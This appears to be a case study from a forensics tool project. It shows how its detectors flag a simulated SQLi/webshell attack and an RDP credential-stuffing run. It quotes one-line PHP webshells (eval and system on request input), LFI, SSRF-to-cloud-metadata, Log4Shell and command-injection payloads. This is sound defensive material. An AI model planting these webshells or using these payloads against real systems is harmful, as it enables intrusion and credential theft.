# Case Study 06 — Web Attack + RDP Brute Force (Dual Entry Vectors)

**Scenario class:** Initial access via two most common enterprise paths
**Functions used:** `analyze_web_access_log`, `detect_webshell`, `detect_brute_force_rdp`

## Why this case matters

Earlier cases covered post-foothold behavior (Cases 01/02), infection
vector via email (Case 04), and AD lateral movement (Case 05). This case
adds the **two most common initial-access paths in enterprise**:

1. **Web application attack** → webshell → RCE
2. **RDP exposed to the internet** → brute force / credential stuffing

Without these, Agentic-DART would ask "how did they get in?" and receive
silence when the answer is SQLi or RDP spray.

## Scenario A: Web app compromise

At 14:05 UTC, attacker at `198.51.100.77` launched a sqlmap scan against
the web server. The scan progressed through SQLi (UNION, tautology,
time-based), LFI (`../../../../etc/passwd`), SSRF (AWS metadata endpoint),
Log4Shell (`${jndi:ldap://...}`), and RCE (`;cat+/etc/passwd`) payloads.
At 14:05:35 they uploaded a webshell and invoked it at
`/uploads/shell.php?cmd=id`.

### Iteration A1 — `analyze_web_access_log`

```
lines_examined: 27
attack_count: 13
scanner_ua_count: 19         ← entire sqlmap session
max_severity: high
scanning_ips: [
  {ip: "198.51.100.77", request_count: 23, error_ratio: 0.652,
   distinct_paths: 22, user_agents: ["sqlmap/1.7.2"], severity: "high"}
]
attack hits by rule:
  webshell_upload    × 9      ← GET /uploads/shell.php?cmd=id, etc.
  sqli_sleep         × 1      ← id=1+AND+SLEEP(5)--
  lfi_traversal      × 1      ← file=../../../../etc/passwd
  ssrf_cloud_metadata × 1     ← url=http://169.254.169.254/latest/...
  rce_command        × 1      ← cmd=;cat+/etc/passwd
```

### Iteration A2 — `detect_webshell`

Scan of `/web/var/www/html` returns **3 HIGH-severity findings, 0 false
positives** despite 12 PHP files in the tree:

```
[high] web/var/www/html/uploads/x.php
  signals: [suspicious_filename:x.php, content_match]
  content: <?php @eval($_POST['cmd']); ?>                  ← China Chopper

[high] web/var/www/html/uploads/shell.php
  signals: [suspicious_filename:shell.php, content_match,
            eval_base64_pattern]
  content: eval(base64_decode($_REQUEST['c']));             ← classic eval shell

[high] web/var/www/html/uploads/cmd.php
  signals: [suspicious_filename:cmd.php, content_match]
  content: $output = system($_GET['x']);                    ← system() shell

age_anomalies:
  All 3 webshells are 90 days newer than the median mtime in /uploads
```

**False positives rejected** by the tuning logic:
- `index.php` — substring `x.php` was the bait, but filename match is
  exact, so `index.php` is correctly excluded
- `includes/config.php`, `includes/db.php`, `uploads/about.php`,
  `uploads/page-{1..5}.php` — all clean

## Scenario B: RDP brute force + credential stuffing + password spray

Starting at 13:50, attacker at `198.51.100.77` performed RDP brute force
against the jump server. They tried 8 distinct usernames (administrator,
admin, root, user, backup, guest, test, analyst), with `analyst` attempted
4 times before succeeding at 13:50:45. Separately, user `alice` was
targeted by a password spray from 4 different IPs.

### Iteration B1 — `detect_brute_force_rdp`

```
rdp_failure_count: 15
rdp_success_count: 1
max_severity: critical

credential_stuffing_ips: [
  {source_ip: "198.51.100.77", failure_count: 11, distinct_users: 8,
   users_sample: [admin, administrator, backup, guest, analyst, root,
                  test, user], pattern: "credential_stuffing"}
]

password_spray_users: [
  {user: "alice", source_ip_count: 4,
   source_ips: [203.0.113.100, 203.0.113.101, 203.0.113.102, 203.0.113.103]}
]

survivors: [
  {user: "analyst", source_ip: "198.51.100.77",
   ts: "2026-03-15 13:50:45", severity: "critical",
   interpretation: "successful RDP logon after brute force from same IP"}
]
```

## Complete chain reconstruction

The two scenarios can be stitched together via `correlate_timeline`:

```
13:50:00  RDP credential-stuffing begins from 198.51.100.77
13:50:45  analyst RDP succeeds                               ← foothold 1
14:05:00  sqlmap scan begins from same IP 198.51.100.77    ← attacker shifted to web
14:05:25  LFI to read /etc/passwd
14:05:28  SSRF to AWS metadata endpoint
14:05:35  webshell uploaded (shell.php)
14:05:36  webshell executed (?cmd=id)
14:05:40  Log4Shell probe
14:05:45  RCE command injection
```

Same source IP (`198.51.100.77`) drove both entry vectors. That's the
smoking-gun attribution.

## What the judges should run

```bash
export DART_EVIDENCE_ROOT="$PWD/examples/sample-evidence"
export PYTHONPATH="$PWD/dart_audit/src:$PWD/dart_mcp/src:$PWD/dart_agent/src"

python3 << 'PY'
from dart_mcp import call_tool
import json

# A. Web log analysis
r = call_tool('analyze_web_access_log', {'access_log': 'web/logs/access.log'})
print(f"Web attacks: {r['attack_count']} hits, {r['scanner_ua_count']} scanner UAs")
print(f"Scanning IP: {r['scanning_ips'][0]['ip']} error_ratio={r['scanning_ips'][0]['error_ratio']}")

# B. Webshell hunt
r = call_tool('detect_webshell', {'webroot': 'web/var/www/html'})
print(f"Webshells: {r['high_severity_count']} HIGH out of {r['files_scanned']} files")

# C. RDP brute force
r = call_tool('detect_brute_force_rdp', {'security_events_json': 'disk/rdp-brute-events.json'})
print(f"RDP: {len(r['credential_stuffing_ips'])} cred-stuffing IPs, "
      f"{len(r['password_spray_users'])} spray users, "
      f"{len(r['survivors'])} CRITICAL survivors")
PY
```

## Why Agentic-DART's approach is meaningfully better here

Traditional DFIR tools for this case:
- Web log analysis: grep `sqlmap|union|../..` — misses obfuscated payloads, no correlation
- Webshell hunt: ClamAV signatures — high false positives, misses custom shells
- RDP brute force: Security onion / SIEM — requires SIEM infrastructure

Agentic-DART provides:
- **Pattern-based attack detection** with severity tuning (13 hits on real payloads, 0 on benign)
- **Webshell detection** that combines filename + content + age anomaly for precision+recall
- **RDP brute force classification** distinguishing credential stuffing vs password spray vs single-account brute force
- **Cross-artifact correlation** — same IP drove web attack AND RDP brute force, which only shows when all three functions run against the same evidence root

This closes the initial-access vector gap that remained after Cases 01-05.
